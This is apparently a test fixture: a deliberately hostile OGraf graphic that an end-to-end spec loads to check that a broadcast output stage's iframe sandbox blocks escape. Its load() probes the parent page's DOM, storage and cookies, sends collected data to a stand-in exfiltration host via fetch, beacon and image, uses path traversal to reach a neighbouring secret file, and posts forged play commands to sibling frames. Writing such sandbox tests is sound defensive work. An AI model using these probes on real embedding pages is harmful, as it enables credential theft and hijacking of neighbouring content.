// A HOSTILE OGraf Graphic, written for e2e/foreign-ograf-sandbox.spec.ts. It conforms to the
// standard so that it is loaded and its code runs, and then, inside load(), it tries every way out
// of the output stage's isolation it can: the parent's DOM, URL and storage, the app's cookies,
// the internet, the files beside its own package, and its neighbours on the stage.
//
// Each attempt is recorded as REACHED (it got through) or REFUSED (it threw, was rejected or
// failed), and everything it managed to read is concatenated into `seen`, so the spec can assert
// that no credential the page holds appears there. The record is written to <pre id="probe">
// in its own DOM, which the spec reads through the frame. Every probe is guarded: a probe that
// throws is a refusal, never a reason to skip the ones after it.

const EXFIL = 'https://exfil.example.com';
const seen = [];
const results = {};

async function probe(name, attempt) {
  try {
    const got = await attempt();
    if (got === false) {
      results[name] = { outcome: 'refused', detail: 'returned false' };
      return;
    }
    const detail = got === undefined ? '' : String(got);
    seen.push(detail);
    results[name] = { outcome: 'reached', detail: detail.slice(0, 300) };
  } catch (err) {
    results[name] = { outcome: 'refused', detail: String((err && err.name) || err) };
  }
}

/** Resolve when an image loads (reached) or fails (refused), bounded so a hang cannot stall. */
function loadImage(src) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    const timer = setTimeout(() => reject(new Error('timeout')), 4000);
    img.onload = () => { clearTimeout(timer); resolve(`image ${img.naturalWidth}x${img.naturalHeight}`); };
    img.onerror = () => { clearTimeout(timer); reject(new Error('image error')); };
    img.src = src;
  });
}

async function runProbes() {
  // What the frame can see of where it lives, without asking anyone.
  seen.push(document.baseURI, document.referrer, location.href, String(location.ancestorOrigins && [...location.ancestorOrigins]), window.name);

  // Reads the PARENT.
  await probe('parent-dom', () => parent.document.title + ' ' + parent.document.documentElement.outerHTML.slice(0, 2000));
  await probe('parent-url', () => parent.location.href);
  await probe('parent-storage', () => JSON.stringify(Object.entries(parent.localStorage)));
  await probe('own-storage', () => JSON.stringify(Object.entries(localStorage)));
  await probe('cookie', () => document.cookie);
  await probe('top-navigation', () => {
    top.location.href = `${EXFIL}/navigate`;
    return 'navigation issued';
  });

  // Fetches the INTERNET. `no-cors`, so a request that leaves resolves: CORS cannot be what stops it.
  await probe('fetch-internet', async () => {
    const res = await fetch(`${EXFIL}/fetch?loot=${encodeURIComponent(seen.join('|').slice(0, 500))}`, { mode: 'no-cors' });
    return `fetched (${res.type})`;
  });
  await probe('image-internet', () => loadImage(`${EXFIL}/pixel.svg`));
  await probe('beacon-internet', () => navigator.sendBeacon(`${EXFIL}/beacon`, 'loot'));

  // Walks OUT of its package: to the page's secret beside the packages and into a sibling
  // package. The harness serves both with CORS open, so only the frame's network policy stands
  // between the probe and the bytes.
  await probe('walk-out-fetch', async () => {
    const res = await fetch(new URL('../../controller-secret.json', import.meta.url));
    return await res.text();
  });
  await probe('walk-out-import', async () => {
    const mod = await import(new URL('../benign/lib/format.mjs', import.meta.url).href);
    return `imported ${Object.keys(mod).join(',')}`;
  });
  await probe('walk-out-image', () => loadImage(new URL('../benign/assets/mark.svg', import.meta.url).href));

  // Commands its NEIGHBOURS: every sibling frame is told to play in NoaCG's preview vocabulary and
  // to play in the foreign bridge's, and the parent is sent a forged state report.
  await probe('command-neighbours', () => {
    let sent = 0;
    for (let i = 0; i < parent.frames.length; i += 1) {
      const win = parent.frames[i];
      if (win === window) continue;
      win.postMessage({ type: 'spx-preview-cmd', cmd: 'play' }, '*');
      win.postMessage({ type: 'noacg-ograf-call', nonce: 'guessed', id: 1, call: 'play', args: [{ goto: 0 }] }, '*');
      sent += 1;
    }
    parent.postMessage({ type: 'spx-preview-state', state: { groups: { forged: 'forged' } }, overflow: [], motion: 0 }, '*');
    return `posted to ${sent} neighbours`;
  });
}

export default class HostileProbe extends HTMLElement {
  async load() {
    await runProbes();
    const pre = document.createElement('pre');
    pre.id = 'probe';
    pre.hidden = true;
    pre.textContent = JSON.stringify({ results, seen: seen.join('\n') });
    this.appendChild(pre);
    return { statusCode: 200 };
  }
  async dispose() { this.innerHTML = ''; return { statusCode: 200 }; }
  async playAction() { return { statusCode: 200, currentStep: 0 }; }
  async stopAction() { return { statusCode: 200 }; }
  async updateAction() { return { statusCode: 200 }; }
  async customAction() { return { statusCode: 200 }; }
}
